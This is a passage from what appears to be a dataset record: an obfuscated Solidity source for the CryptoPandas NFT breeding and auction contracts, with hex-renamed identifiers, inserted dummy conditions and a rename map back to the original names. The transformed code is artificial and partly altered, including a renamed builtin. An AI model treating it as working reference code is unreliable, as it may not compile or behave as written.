address(0));\n\n        _0xed95dc[_0x8287a1] = _0x0bd446;\n    }\n    /// @dev Creates and begins a new auction.\n    /// @param _tokenId - ID of token to auction, sender must be owner.\n    /// @param _startingPrice - Price of item (in wei) at beginning of auction.\n    /// @param _endingPrice - Price of item (in wei) at end of auction.\n    /// @param _duration - Length of auction (in seconds).\n    /// @param _seller - Seller, if not the message sender\n    function _0xc5c01a(\n        uint256 _0x7651ea,\n        address _0x7bf1dd,\n        uint256 _0xac3729,\n        uint256 _0x25e497,\n        uint256 _0x0a2d9f,\n        address _0x43bc09\n    )\n        external\n    {\n\n        // to store them in the auction struct.\n        require(_0xac3729 == uint256(uint128(_0xac3729)));\n        require(_0x25e497 == uint256(uint128(_0x25e497)));\n        require(_0x0a2d9f == uint256(uint64(_0x0a2d9f)));\n\n        require(msg.sender == address(_0xd233c5));\n\n        require (_0xed95dc[_0x7bf1dd] > 0);\n\n        _0x80d649(_0x43bc09, _0x7651ea);\n        Auction memory _0x9e3993 = Auction(\n            _0x43bc09,\n            uint128(_0xac3729),\n            uint128(_0x25e497),\n            uint64(_0x0a2d9f),\n            uint64(_0xa86656),\n            0\n        );\n        _0xebb899(_0x7651ea, _0x9e3993, _0x7bf1dd);\n        _0xb8b936[_0x7651ea] = _0x7bf1dd;\n    }\n\n    /// @dev Adds an auction to the list of open auctions. Also fires the\n    ///  AuctionCreated event.\n    /// @param _tokenId The ID of the token to be put on auction.\n    /// @param _auction Auction to add.\n    function _0xebb899(uint256 _0x7651ea, Auction _0xb752eb, address _0x8287a1) internal {\n        // Require that all auctions have a duration of\n        // at least one minute. (Keeps our math from getting hairy!)\n        require(_0xb752eb._0xa88913 >= 1 minutes);\n\n        _0xe877df[_0x7651ea] = _0xb752eb;\n\n        AuctionERC20Created(\n            uint256(_0x7651ea),\n            uint256(_0xb752eb._0x88a9ea),\n            uint256(_0xb752eb._0xd18782),\n            uint256(_0xb752eb._0xa88913),\n            _0x8287a1\n        );\n    }\n\n    function _0xaed5e6(uint256 _0x7651ea)\n        external\n        payable{\n            // do nothing\n    }\n\n    /// @dev Updates lastSalePrice if seller is the nft contract\n    /// Otherwise, works the same as default bid method.\n    function _0x74ff9a(uint256 _0x7651ea,uint256 _0xa18c23)\n        external\n    {\n        // _bid verifies token ID size\n        address _0x89ff99 = _0xe877df[_0x7651ea]._0x89ff99;\n        address _0x8287a1 = _0xb8b936[_0x7651ea];\n        require (_0x8287a1 != address(0));\n        uint256 _0x82ab71 = _0xd46626(_0x8287a1,msg.sender,_0x7651ea, _0xa18c23);\n        _0x336ab1(msg.sender, _0x7651ea);\n        delete _0xb8b936[_0x7651ea];\n    }\n\n    function _0x1da6c2(uint256 _0x7651ea)\n        external\n    {\n        Auction storage _0x9e3993 = _0xe877df[_0x7651ea];\n        require(_0x8fcfd9(_0x9e3993));\n        address _0x89ff99 = _0x9e3993._0x89ff99;\n        require(msg.sender == _0x89ff99);\n        _0x5ba50e(_0x7651ea, _0x89ff99);\n        delete _0xb8b936[_0x7651ea];\n    }\n\n    function _0x8c1f2a(address _0x7bf1dd, address _0x57cad2) external returns(bool _0xf98fc2)  {\n        require (_0xc8f629[_0x7bf1dd] > 0);\n        require(msg.sender == address(_0xd233c5));\n        ERC20(_0x7bf1dd).transfer(_0x57cad2, _0xc8f629[_0x7bf1dd]);\n    }\n\n    /// @dev Computes the price and transfers winnings.\n    /// Does NOT transfer ownership of token.\n    function _0xd46626(address _0x7bf1dd,address _0x574e43, uint256 _0x7651ea, uint256 _0x724b52)\n        internal\n        returns (uint256)\n    {\n        // Get a reference to the auction struct\n        Auction storage _0x9e3993 = _0xe877df[_0x7651ea];\n\n        // Explicitly check that this auction is currently live.\n        // (Because of how Ethereum mappings work, we can't just count\n        // on the lookup above failing. An invalid _tokenId will just\n        // return an auction object that is all zeros.)\n        require(_0x8fcfd9(_0x9e3993));\n\n        require (_0x7bf1dd != address(0) && _0x7bf1dd == _0xb8b936[_0x7651ea]);\n\n        // Check that the bid is greater than or equal to the current price\n        uint256 _0x82ab71 = _0xa91a4c(_0x9e3993);\n        require(_0x724b52 >= _0x82ab71);\n\n        // Grab a reference to the seller before the auction struct\n        // gets deleted.\n        address _0x89ff99 = _0x9e3993._0x89ff99;\n\n        // The bid is good! Remove the auction before sending the fees\n        _0x72db79(_0x7651ea);\n\n        // Transfer proceeds to seller (if there are any!)\n        if (_0x82ab71 > 0) {\n            // Calculate the auctioneer's cut.\n            // (NOTE: _computeCut() is guaranteed to return a\n            // value <= price, so this subtraction can't go negative.)\n            uint256 _0xfdee13 = _0x3c2c9b(_0x82ab71);\n            uint256 _0x9dcdcf = _0x82ab71 - _0xfdee13;\n\n            // Send Erc20 Token to seller should call Erc20 contract\n            // Reference to contract\n            require(ERC20(_0x7bf1dd)._0xeaa4ff(_0x574e43,_0x89ff99,_0x9dcdcf));\n            if (_0xfdee13 > 0){\n                require(ERC20(_0x7bf1dd)._0xeaa4ff(_0x574e43,address(this),_0xfdee13));\n                _0xc8f629[_0x7bf1dd] += _0xfdee13;\n            }\n        }\n\n        // Tell the world!\n        AuctionSuccessful(_0x7651ea, _0x82ab71, msg.sender);\n\n        return _0x82ab71;\n    }\n}\n\n/// @title Handles creating auctions for sale and siring of pandas.\n///  This wrapper of ReverseAuction exists only so that users can create\n///  auctions with only one transaction.\ncontract PandaAuction is PandaBreeding {\n\n    // @notice The auction contract variables are defined in PandaBase to allow\n    //  us to refer to them in PandaOwnership to prevent accidental transfers.\n    // `saleAuction` refers to the auction for gen0 and p2p sale of pandas.\n    // `siringAuction` refers to the auction for siring rights of pandas.\n\n    /// @dev Sets the reference to the sale auction.\n    /// @param _address - Address of sale contract.\n    function _0xc09b7e(address _0x35911f) external _0xb46b56 {\n        SaleClockAuction _0x1dde86 = SaleClockAuction(_0x35911f);\n\n        // NOTE: verify that a contract is what we expect - https://github.com/Lunyr/crowdsale-contracts/blob/cfadd15986c30521d8ba7d5b6f57b4fefcc7ac38/contracts/LunyrToken.sol#L117\n        require(_0x1dde86._0x80c52d());\n\n        // Set the new contract address\n        _0x09ecb3 = _0x1dde86;\n    }\n\n    function _0x2fb06d(address _0x35911f) external _0xb46b56 {\n        SaleClockAuctionERC20 _0x1dde86 = SaleClockAuctionERC20(_0x35911f);\n\n        // NOTE: verify that a contract is what we expect - https://github.com/Lunyr/crowdsale-contracts/blob/cfadd15986c30521d8ba7d5b6f57b4fefcc7ac38/contracts/LunyrToken.sol#L117\n        require(_0x1dde86._0xb2e46e());\n\n        // Set the new contract address\n        _0xc0ef6f = _0x1dde86;\n    }\n\n    /// @dev Sets the reference to the siring auction.\n    /// @param _address - Address of siring contract.\n    function _0x1ff764(address _0x35911f) external _0xb46b56 {\n        SiringClockAuction _0x1dde86 = SiringClockAuction(_0x35911f);\n\n        // NOTE: verify that a contract is what we expect - https://github.com/Lunyr/crowdsale-contracts/blob/cfadd15986c30521d8ba7d5b6f57b4fefcc7ac38/contracts/LunyrToken.sol#L117\n        require(_0x1dde86._0xb654d9());\n\n        // Set the new contract address\n        _0x721724 = _0x1dde86;\n    }\n\n    /// @dev Put a panda up for auction.\n    ///  Does some ownership trickery to create auctions in one tx.\n    function _0xf59a85(\n        uint256 _0x645c2f,\n        uint256 _0xac3729,\n        uint256 _0x25e497,\n        uint256 _0x0a2d9f\n    )\n        external\n        _0x31b995\n    {\n        // Auction contract checks input sizes\n        // If panda is already on any auction, this will throw\n        // because it will be owned by the auction contract.\n        require(_0x1e9a1b(msg.sender, _0x645c2f));\n        // Ensure the panda is not pregnant to prevent the auction\n        // contract accidentally receiving ownership of the child.\n        // NOTE: the panda IS allowed to be in a cooldown.\n        require(!_0x07398f(_0x645c2f));\n        _0xd8a11d(_0x645c2f, _0x09ecb3);\n        // Sale auction throws if inputs are invalid and clears\n        // transfer and sire approval after escrowing the panda.\n        _0x09ecb3._0xc5c01a(\n            _0x645c2f,\n            _0xac3729,\n            _0x25e497,\n            _0x0a2d9f,\n            msg.sender\n        );\n    }\n\n    /// @dev Put a panda up for auction.\n    ///  Does some ownership trickery to create auctions in one tx.\n    function _0xd85320(\n        uint256 _0x645c2f,\n        address _0x8287a1,\n        uint256 _0xac3729,\n        uint256 _0x25e497,\n        uint256 _0x0a2d9f\n    )\n        external\n        _0x31b995\n    {\n        // Auction contract checks input sizes\n        // If panda is already on any auction, this will throw\n        // because it will be owned by the auction contract.\n        require(_0x1e9a1b(msg.sender, _0x645c2f));\n        // Ensure the panda is not pregnant to prevent the auction\n        // contract accidentally receiving ownership of the child.\n        // NOTE: the panda IS allowed to be in a cooldown.\n        require(!_0x07398f(_0x645c2f));\n        _0xd8a11d(_0x645c2f, _0xc0ef6f);\n        // Sale auction throws if inputs are invalid and clears\n        // transfer and sire approval after escrowing the panda.\n        _0xc0ef6f._0xc5c01a(\n            _0x645c2f,\n            _0x8287a1,\n            _0xac3729,\n            _0x25e497,\n            _0x0a2d9f,\n            msg.sender\n        );\n    }\n\n    function _0x04ad01(address _0x8287a1, uint256 _0x0bd446) external _0xc02dcc{\n        _0xc0ef6f._0x9352a6(_0x8287a1,_0x0bd446);\n    }\n\n    /// @dev Put a panda up for auction to be sire.\n    ///  Performs checks to ensure the panda can be sired, then\n    ///  delegates to reverse auction.\n    function _0x380d24(\n        uint256 _0x645c2f,\n        uint256 _0xac3729,\n        uint256 _0x25e497,\n        uint256 _0x0a2d9f\n    )\n        external\n        _0x31b995\n    {\n        // Auction contract checks input sizes\n        // If panda is already on any auction, this will throw\n        // because it will be owned by the auction contract.\n        require(_0x1e9a1b(msg.sender, _0x645c2f));\n        require(_0x06d8b0(_0x645c2f));\n        _0xd8a11d(_0x645c2f, _0x721724);\n        // Siring auction throws if inputs are invalid and clears\n        // transfer and sire approval after escrowing the panda.\n        _0x721724._0xc5c01a(\n            _0x645c2f,\n            _0xac3729,\n            _0x25e497,\n            _0x0a2d9f,\n            msg.sender\n        );\n    }\n\n    /// @dev Completes a siring auction by bidding.\n    ///  Immediately breeds the winning matron with the sire on auction.\n    /// @param _sireId - ID of the sire on auction.\n    /// @param _matronId - ID of the matron owned by the bidder.\n    function _0xc2d679(\n        uint256 _0x573631,\n        uint256 _0x3ca881\n    )\n        external\n        payable\n        _0x31b995\n    {\n        // Auction contract checks input sizes\n        require(_0x1e9a1b(msg.sender, _0x3ca881));\n        require(_0x06d8b0(_0x3ca881));\n        require(_0x2ce029(_0x3ca881, _0x573631));\n\n        // Define the current price of the auction.\n        uint256 _0xfb63a8 = _0x721724._0xbede5b(_0x573631);\n        require(msg.value >= _0xfb63a8 + _0x2cfff6);\n\n        // Siring auction will throw if the bid fails.\n        _0x721724._0xaed5e6.value(msg.value - _0x2cfff6)(_0x573631);\n        _0x1669d4(uint32(_0x3ca881), uint32(_0x573631), msg.sender);\n    }\n\n    /// @dev Transfers the balance of the sale auction contract\n    /// to the PandaCore contract. We use two-step withdrawal to\n    /// prevent two transfer calls in the auction bid function.\n    function _0xb551dd() external _0x66bdce {\n        _0x09ecb3._0xaeec1e();\n        _0x721724._0xaeec1e();\n    }\n\n    function _0x8c1f2a(address _0x7bf1dd, address _0x57cad2) external _0x66bdce {\n        require(_0xc0ef6f != address(0));\n        _0xc0ef6f._0x8c1f2a(_0x7bf1dd,_0x57cad2);\n    }\n}\n\n/// @title all functions related to creating kittens\ncontract PandaMinting is PandaAuction {\n\n    // Limits the number of cats the contract owner can ever create.\n    //uint256 public constant PROMO_CREATION_LIMIT = 5000;\n    uint256 public constant GEN0_CREATION_LIMIT = 45000;\n\n    // Constants for gen0 auctions.\n    uint256 public constant GEN0_STARTING_PRICE = 100 finney;\n    uint256 public constant GEN0_AUCTION_DURATION = 1 days;\n    uint256 public constant OPEN_PACKAGE_PRICE = 10 finney;\n\n    // Counts the number of cats the contract owner has created.\n    //uint256 public promoCreatedCount;\n\n    /// @dev we can create promo kittens, up to a limit. Only callable by COO\n    /// @param _genes the encoded genes of the kitten to be created, any value is accepted\n    /// @param _owner the future owner of the created kittens. Default to contract COO\n    function _0x904bec(uint256[2] _0xb6ca44, uint256 _0x6f15c7, address _0xa17562) external _0xc02dcc {\n        address _0xf8f8cc = _0xa17562;\n        if (_0xf8f8cc == address(0)) {\n            if (gasleft() > 0) { _0xf8f8cc = _0x9e5ae2; }\n        }\n\n        _0xaeb255(0, 0, _0x6f15c7, _0xb6ca44, _0xf8f8cc);\n    }\n\n    /// @dev create pandaWithGenes\n    /// @param _genes panda genes\n    /// @param _type  0 common 1 rare\n    function _0xe5973b(uint256[2] _0xb6ca44,uint256 _0x6f15c7,uint256 _0xf71efa)\n        external\n        payable\n        _0xc02dcc\n        _0x31b995\n    {\n        require(msg.value >= OPEN_PACKAGE_PRICE);\n        uint256 _0x94356e = _0xaeb255(0, 0, _0x6f15c7, _0xb6ca44, _0x09ecb3);\n        _0x09ecb3._0xe5973b(_0x94356e,_0xf71efa);\n    }\n\n    //function buyPandaERC20(address _erc20Address, address _buyerAddress, uint256 _pandaID, uint256 _amount)\n    //external\n    //onlyCOO\n    //whenNotPaused {\n    //    saleAuctionERC20.bid(_erc20Address, _buyerAddress, _pandaID, _amount);\n    //}\n\n    /// @dev Creates a new gen0 panda with the given genes and\n    ///  creates an auction for it.\n    //function createGen0Auction(uint256[2] _genes) external onlyCOO {\n    //    require(gen0CreatedCount < GEN0_CREATION_LIMIT);\n    //\n    //    uint256 pandaId = _createPanda(0, 0, 0, _genes, address(this));\n    //    _approve(pandaId, saleAuction);\n    //\n    //    saleAuction.createAuction(\n    //        pandaId,\n    //        _computeNextGen0Price(),\n    //        0,\n    //        GEN0_AUCTION_DURATION,\n    //        address(this)\n    //    );\n    //\n    //    gen0CreatedCount++;\n    //}\n\n    function _0x214fde(uint256 _0x645c2f) external _0xc02dcc {\n        require(_0x1e9a1b(msg.sender, _0x645c2f));\n        //require(pandas[_pandaId].generation==1);\n\n        _0xd8a11d(_0x645c2f, _0x09ecb3);\n\n        _0x09ecb3._0x214fde(\n            _0x645c2f,\n            _0x1de9c5(),\n            0,\n            GEN0_AUCTION_DURATION,\n            msg.sender\n        );\n    }\n\n    /// @dev Computes the next gen0 auction starting price, given\n    ///  the average of the past 5 prices + 50%.\n    function _0x1de9c5() internal view returns(uint256) {\n        uint256 _0xec8188 = _0x09ecb3._0x16be98();\n\n        require(_0xec8188 == uint256(uint128(_0xec8188)));\n\n        uint256 _0x749759 = _0xec8188 + (_0xec8188 / 2);\n\n        // We never auction for less than starting price\n        if (_0x749759 < GEN0_STARTING_PRICE) {\n            _0x749759 = GEN0_STARTING_PRICE;\n        }\n\n        return _0x749759;\n    }\n}\n\n/// @title CryptoPandas: Collectible, breedable, and oh-so-adorable cats on the Ethereum blockchain.\n/// @author Axiom Zen (https://www.axiomzen.co)\n/// @dev The main CryptoPandas contract, keeps track of kittens so they don't wander around and get lost.\ncontract PandaCore is PandaMinting {\n\n    // This is the main CryptoPandas contract. In order to keep our code seperated into logical sections,\n    // we've broken it up in two ways. First, we have several seperately-instantiated sibling contracts\n    // that handle auctions and our super-top-secret genetic combination algorithm. The auctions are\n    // seperate since their logic is somewhat complex and there's always a risk of subtle bugs. By keeping\n    // them in their own contracts, we can upgrade them without disrupting the main contract that tracks\n    // panda ownership. The genetic combination algorithm is kept seperate so we can open-source all of\n    // the rest of our code without making it _too_ easy for folks to figure out how the genetics work.\n    // Don't worry, I'm sure someone will reverse engineer it soon enough!\n    //\n    // Secondly, we break the core contract into multiple files using inheritence, one for each major\n    // facet of functionality of CK. This allows us to keep related code bundled together while still\n    // avoiding a single giant file with everything in it. The breakdown is as follows:\n    //\n    //      - PandaBase: This is where we define the most fundamental code shared throughout the core\n    //             functionality. This includes our main data storage, constants and data types, plus\n    //             internal functions for managing these items.\n    //\n    //      - PandaAccessControl: This contract manages the various addresses and constraints for operations\n    //             that can be executed only by specific roles. Namely CEO, CFO and COO.\n    //\n    //      - PandaOwnership: This provides the methods required for basic non-fungible token\n    //             transactions, following the draft ERC-721 spec (https://github.com/ethereum/EIPs/issues/721).\n    //\n    //      - PandaBreeding: This file contains the methods necessary to breed cats together, including\n    //             keeping track of siring offers, and relies on an external genetic combination contract.\n    //\n    //      - PandaAuctions: Here we have the public methods for auctioning or bidding on cats or siring\n    //             services. The actual auction functionality is handled in two sibling contracts (one\n    //             for sales and one for siring), while auction creation and bidding is mostly mediated\n    //             through this facet of the core contract.\n    //\n    //      - PandaMinting: This final facet contains the functionality we use for creating new gen0 cats.\n    //             the community is new), and all others can only be created and then immediately put up\n    //             for auction via an algorithmically determined starting price. Regardless of how they\n    //             are created, there is a hard limit of 50k gen0 cats. After that, it's all up to the\n    //             community to breed, breed, breed!\n\n    // Set in case the core contract is broken and an upgrade is required\n    address public _0x9ffe74;\n\n    /// @notice Creates the main CryptoPandas smart contract instance.\n    function PandaCore() public {\n        // Starts paused.\n        if (1 == 1) { _0x5b0417 = true; }\n\n        // the creator of the contract is the initial CEO\n        if (true) { _0x9a4ffd = msg.sender; }\n\n        // the creator of the contract is also the initial COO\n        _0x9e5ae2 = msg.sender;\n\n        // move these code to init(), so we not excceed gas limit\n        //uint256[2] memory _genes = [uint256(-1),uint256(-1)];\n\n        //wizzPandaQuota[1] = 100;\n\n        //_createPanda(0, 0, 0, _genes, address(0));\n    }\n\n    /// init contract\n    function _0x14357a() external _0xb46b56 _0xf47ac1 {\n        // make sure init() only run once\n        require(_0xb0b86d.length == 0);\n        // start with the mythical kitten 0 - so we don't have generation-0 parent issues\n        uint256[2] memory _0xb6ca44 = [uint256(-1),uint256(-1)];\n\n        _0x116505[1] = 100;\n       _0xaeb255(0, 0, 0, _0xb6ca44, address(0));\n    }\n\n    /// @dev Used to mark the smart contract as upgraded, in case there is a serious\n\n    ///  emit a message indicating that the new address is set. It's up to clients of this\n    ///  contract to update to the new contract address in that case. (This contract will\n    ///  be paused indefinitely if such an upgrade takes place.)\n    /// @param _v2Address new address\n    function _0x8f7837(address _0xd59a4b) external _0xb46b56 _0xf47ac1 {\n        // See README.md for updgrade plan\n        _0x9ffe74 = _0xd59a4b;\n        ContractUpgrade(_0xd59a4b);\n    }\n\n    /// @notice No tipping!\n    /// @dev Reject all Ether from being sent here, unless it's from one of the\n    ///  two auction contracts. (Hopefully, we can prevent user accidents.)\n    function() external payable {\n        require(\n            msg.sender == address(_0x09ecb3) ||\n            msg.sender == address(_0x721724)\n        );\n    }\n\n    /// @notice Returns all the relevant information about a specific panda.\n    /// @param _id The ID of the panda of interest.\n    function _0xd9dc57(uint256 _0x828784)\n        external\n        view\n        returns (\n        bool _0xb230ff,\n        bool _0x838372,\n        uint256 _0x9c1f9e,\n        uint256 _0x77dab4,\n        uint256 _0xdb6d0f,\n        uint256 _0x795adf,\n        uint256 _0xbb3677,\n        uint256 _0xb7adc0,\n        uint256 _0x125c0d,\n        uint256[2] _0xbf1ecd\n    ) {\n        Panda storage _0x272bcd = _0xb0b86d[_0x828784];\n\n        // if this variable is 0 then it's not gestating\n        _0xb230ff = (_0x272bcd._0xdb6d0f != 0);\n        _0x838372 = (_0x272bcd._0x0221f6 <= block.number);\n        _0x9c1f9e = uint256(_0x272bcd._0x9c1f9e);\n        _0x77dab4 = uint256(_0x272bcd._0x0221f6);\n        _0xdb6d0f = uint256(_0x272bcd._0xdb6d0f);\n        _0x795adf = uint256(_0x272bcd._0x795adf);\n        _0xbb3677 = uint256(_0x272bcd._0xbb3677);\n        _0xb7adc0 = uint256(_0x272bcd._0xb7adc0);\n        _0x125c0d = uint256(_0x272bcd._0x125c0d);\n        _0xbf1ecd = _0x272bcd._0xbf1ecd;\n    }\n\n    /// @dev Override unpause so it requires all external contract addresses\n    ///  to be set before contract can be unpaused. Also, we can't have\n    ///  newContractAddress set either, because then the contract was upgraded.\n    /// @notice This is public rather than external so we can call super.unpause\n    ///  without using an expensive CALL.\n    function _0xef4a6e() public _0xb46b56 _0xf47ac1 {\n        require(_0x09ecb3 != address(0));\n        require(_0x721724 != address(0));\n        require(_0xccef14 != address(0));\n        require(_0x9ffe74 == address(0));\n\n        // Actually unpause the contract.\n        super._0xef4a6e();\n    }\n\n    // @dev Allows the CFO to capture the balance available to the contract.\n    function _0xaeec1e() external _0x586166 {\n        uint256 balance = this.balance;\n        // Subtract all the currently pregnant kittens we have, plus 1 of margin.\n        uint256 _0x2cd23c = (_0xc24ce3 + 1) * _0x2cfff6;\n\n        if (balance > _0x2cd23c) {\n            _0x5371ec.send(balance - _0x2cd23c);\n        }\n    }\n}\n",
      "rename_map": {
        "setSaleAuctionERC20Address": "_0x2fb06d",
        "switchSaleAuctionERC20For": "_0x04ad01",
        "setSiringAuctionAddress": "_0x1ff764",
        "withdrawAuctionBalances": "_0xb551dd",
        "cancelAuctionWhenPaused": "_0xa8d776",
        "isSaleClockAuctionERC20": "_0xb2e46e",
        "_canBreedWithViaAuction": "_0x2ce029",
        "createSaleAuctionERC20": "_0xd85320",
        "erc20ContractsSwitcher": "_0xed95dc",
        "_computeNextGen0Price": "_0x1de9c5",
        "_exchangeMatronSireId": "_0xdb4577",
        "setSaleAuctionAddress": "_0xc09b7e",
        "setGeneScienceAddress": "_0x368239",
        "tokenIdToErc20Address": "_0xb8b936",
        "withdrawERC20Balance": "_0x8c1f2a",
        "_computeCurrentPrice": "_0xafcbf5",
        "sireAllowedToAddress": "_0x752173",
        "pandaIndexToApproved": "_0xda3de8",
        "isSiringClockAuction": "_0xb654d9",
        "averageGen0SalePrice": "_0x16be98",
        "_isReadyToGiveBirth": "_0x41b298",
        "ownershipTokenCount": "_0x9dca6e",
        "getWizzPandaCountOf": "_0xf40068",
        "setTotalWizzPandaOf": "_0x0caaa8",
        "createSiringAuction": "_0x380d24",
        "erc20ContractSwitch": "_0x9352a6",
        "nonFungibleContract": "_0xd233c5",
        "getWizzPandaQuotaOf": "_0x7adca5",
        "setSecondsPerBlock": "_0x7e03f0",
        "_isValidMatingPair": "_0x7e7fb8",
        "newContractAddress": "_0x9ffe74",
        "_isSiringPermitted": "_0x9b716d",
        "bidOnSiringAuction": "_0xc2d679",
        "lastGen0SalePrices": "_0x5af66c",
        "isSaleClockAuction": "_0x80c52d",
        "currentPriceChange": "_0xf378b8",
        "candidateContract": "_0x1dde86",
        "supportsInterface": "_0xc88e1a",
        "transferOwnership": "_0x860f25",
        "createGen0Auction": "_0x214fde",
        "pandaIndexToOwner": "_0x297de9",
        "createSaleAuction": "_0xf59a85",
        "tokenIdToAuction": "_0xe877df",
        "cooldownEndBlock": "_0x0221f6",
        "saleAuctionERC20": "_0xc0ef6f",
        "totalPriceChange": "_0x383299",
        "gen0CreatedCount": "_0x288b09",
        "_addAuctionERC20": "_0xebb899",
        "_triggerCooldown": "_0xd1ee50",
        "secondsPerBlock": "_0x0132dd",
        "withdrawBalance": "_0xaeec1e",
        "setAutoBirthFee": "_0x56306d",
        "createWizzPanda": "_0x904bec",
        "getCurrentPrice": "_0xbede5b",
        "getPureFromGene": "_0xca443f",
        "_isReadyToBreed": "_0xe5c961",
        "isReadyToBreed": "_0x06d8b0",
        "wizzPandaQuota": "_0x116505",
        "sellerProceeds": "_0x9dcdcf",
        "_cancelAuction": "_0x5ba50e",
        "wizzPandaCount": "_0x05e071",
        "_startingPrice": "_0xac3729",
        "_secondsPassed": "_0x3ab561",
        "pregnantPandas": "_0xc24ce3",
        "_removeAuction": "_0x72db79",
        "_erc20address": "_0x8287a1",
        "_currentPrice": "_0xa91a4c",
        "createAuction": "_0xc5c01a",
        "auctioneerCut": "_0xfdee13",
        "secondsPassed": "_0x15c64d",
        "siringAuction": "_0x721724",
        "breedWithAuto": "_0x3c9dd6",
        "getWizzTypeOf": "_0x815571",
        "_erc20Address": "_0x7bf1dd",
        "cancelAuction": "_0x1da6c2",
        "erc20Contract": "_0x787f2b",
        "clearWizzType": "_0x83e71a",
        "surprisePanda": "_0x45a929",
        "cooldownIndex": "_0x9c1f9e",
        "_stringLength": "_0x000c6c",
        "gen0SaleCount": "_0x5bb1d1",
        "setNewAddress": "_0x8f7837",
        "approveSiring": "_0xedba04",
        "tokensOfOwner": "_0x770f01",
        "_buyerAddress": "_0x574e43",
        "isGeneScience": "_0xf36431",
        "startingPrice": "_0x88a9ea",
        "whenNotPaused": "_0x31b995",
        "_createPanda": "_0xaeb255",
        "transferFrom": "_0xeaa4ff",
        "currentPrice": "_0xfb63a8",
        "nextActionAt": "_0x77dab4",
        "_endingPrice": "_0x25e497",
        "_isOnAuction": "_0x8fcfd9",
        "autoBirthFee": "_0x2cfff6",
        "subtractFees": "_0x2cd23c",
        "siringWithId": "_0xdb6d0f",
        "_approvedFor": "_0x68fddb",
        "packageCount": "_0x9ec8ed",
        "_interfaceID": "_0x326f7f",
        "outputString": "_0xdba98f",
        "canBreedWith": "_0x42bbf3",
        "targetBlock": "_0x138a75",
        "_nftAddress": "_0x260501",
        "probability": "_0x540dc0",
        "createPanda": "_0xe5973b",
        "_addAuction": "_0xedb1f0",
        "resultIndex": "_0x6012da",
        "getWizzType": "_0xfb5aa1",
        "isGestating": "_0xb230ff",
        "_computeCut": "_0x3c2c9b",
        "getMetadata": "_0x92564a",
        "totalSupply": "_0x587faa",
        "newContract": "_0xc51cc9",
        "saleAuction": "_0x09ecb3",
        "matronOwner": "_0x5d6a0c",
        "_childGenes": "_0x8bbe0f",
        "newKittenId": "_0x44ab83",
        "geneScience": "_0xccef14",
        "endingPrice": "_0xd18782",
        "ownerTokens": "_0x7f66a6",
        "_generation": "_0x6f15c7",
        "nftAddress": "_0xe0184c",
        "pureDegree": "_0xe8cd7e",
        "getAuction": "_0x915f05",
        "_breedWith": "_0x1669d4",
        "cfoAddress": "_0x5371ec",
        "onlyCLevel": "_0x66bdce",
        "totalPrice": "_0x16a5ae",
        "_v2Address": "_0xd59a4b",
        "childGenes": "_0x8e4ee8",
        "isPregnant": "_0x07398f",
        "childOwner": "_0xa1466f",
        "generation": "_0x125c0d",
        "ceoAddress": "_0x9a4ffd",
        "cooAddress": "_0x9e5ae2",
        "whenPaused": "_0xf47ac1",
        "tokenCount": "_0x8646e7",
        "_allowance": "_0x9db7ec",
        "pandaOwner": "_0xf8f8cc",
        "_bidAmount": "_0x724b52",
        "onlyOwner": "_0x5d8f83",
        "balanceOf": "_0xe105b2",
        "_duration": "_0x0a2d9f",
        "_toString": "_0x5fc38a",
        "outputPtr": "_0x827792",
        "_bidERC20": "_0xd46626",
        "_transfer": "_0x336ab1",
        "_claimant": "_0x5a3786",
        "bidExcess": "_0x0bfcd5",
        "parentGen": "_0xb84d69",
        "allowance": "_0xafebb0",
        "birthTime": "_0x795adf",
        "_matronId": "_0x3ca881",
        "totalCats": "_0x659d22",
        "sireOwner": "_0xb48c38",
        "cooldowns": "_0xb6ebec",
        "nextPrice": "_0x749759",
        "_approved": "_0xf918aa",
        "giveBirth": "_0x665905",
        "_rawBytes": "_0xe425f4",
        "startedAt": "_0xe76acc",
        "keccak256": "_0x8109f2",
        "_receiver": "_0xda57ff",
        "getPanda": "_0xd9dc57",
        "_nftAddr": "_0x619ba1",
        "duration": "_0xa88913",
        "_factors": "_0xef531d",
        "matronId": "_0xbb3677",
        "_address": "_0x35911f",
        "_pandaId": "_0x645c2f",
        "avePrice": "_0xec8188",
        "kittenId": "_0x94356e",
        "mixGenes": "_0x858911",
        "approved": "_0x638b7c",
        "newOwner": "_0x4acc12",
        "bytesPtr": "_0xbed2b6",
        "_tokenId": "_0x7651ea",
        "destpart": "_0x6c5d68",
        "_approve": "_0xd8a11d",
        "ownerCut": "_0x5da1c5",
        "bidERC20": "_0x74ff9a",
        "surprise": "_0xc57301",
        "_auction": "_0xb752eb",
        "balances": "_0xc8f629",
        "_memcpy": "_0xde1337",
        "tokenId": "_0x329ab7",
        "auction": "_0x9e3993",
        "_newCOO": "_0x7415a1",
        "onlyCFO": "_0x586166",
        "approve": "_0x720bc2",
        "_newCFO": "_0xa8270b",
        "unpause": "_0xef4a6e",
        "_escrow": "_0x80d649",
        "onlyCOO": "_0xc02dcc",
        "isReady": "_0x838372",
        "_seller": "_0x43bc09",
        "ownerOf": "_0x2aab77",
        "_newCEO": "_0x266ed0",
        "_amount": "_0xa18c23",
        "srcpart": "_0x0342e0",
        "spender": "_0x75fcff",
        "_sireId": "_0x573631",
        "onlyCEO": "_0xb46b56",
        "pandaId": "_0xdacb39",
        "_kitten": "_0x78c8ab",
        "_matron": "_0x05f201",
        "_price": "_0xe9fc2a",
        "pandas": "_0xb0b86d",
        "seller": "_0x89ff99",
        "setCOO": "_0x84a7c3",
        "isGen0": "_0xe37bd2",
        "getSex": "_0xa15da8",
        "winner": "_0xbaa6c2",
        "supply": "_0x0ce1e7",
        "setCFO": "_0x4b7480",
        "_owner": "_0xa17562",
        "sireId": "_0xb7adc0",
        "genes2": "_0x092cee",
        "_panda": "_0x6ded2b",
        "genes1": "_0x14d031",
        "buffer": "_0xb5914d",
        "common": "_0xe139dd",
        "result": "_0x4b9aea",
        "symbol": "_0x905f37",
        "matron": "_0x3b6482",
        "_onoff": "_0x0bd446",
        "_total": "_0x0d4488",
        "setCEO": "_0x55585c",
        "_genes": "_0xb6ca44",
        "paused": "_0x5b0417",
        "total": "_0x17f12f",
        "_addr": "_0x4bb4cd",
        "_sire": "_0x59c0ac",
        "pause": "_0x027adb",
        "_type": "_0xf71efa",
        "bHash": "_0x0a9e39",
        "price": "_0x82ab71",
        "genes": "_0xbf1ecd",
        "catId": "_0x45d7f7",
        "_from": "_0x82025c",
        "_gene": "_0xf9c486",
        "count": "_0x3aff36",
        "_dest": "_0xa7b436",
        "owner": "_0xe349a8",
        "_owns": "_0x1e9a1b",
        "init": "_0x14357a",
        "sire": "_0x03ff36",
        "mask": "_0xd0ff32",
        "gene": "_0xeb481b",
